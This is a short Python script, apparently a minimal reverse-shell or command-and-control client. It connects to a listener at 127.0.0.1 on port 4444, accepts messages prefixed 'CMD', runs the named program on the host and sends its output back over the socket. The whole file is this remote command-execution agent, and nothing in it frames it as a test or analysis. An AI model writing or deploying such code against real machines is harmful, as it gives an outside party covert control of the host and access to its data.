#!/usr/bin/env python3

import subprocess
import socket

HOST = "127.0.0.1"
PORT = 4444

def main():
    global HOST, PORT
    
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((HOST, PORT))
            data = s.recv(1024).decode("utf-8")
            line = data.split(" ")
            if line[0] == "CMD":
                res = subprocess.run([line[1].strip()], stdout=subprocess.PIPE)
                s.send(res.stdout)

    except Exception as e:
        print("[ERROR] - Problem during communication!")
        print(e)
        
if __name__ == "__main__":
    main()
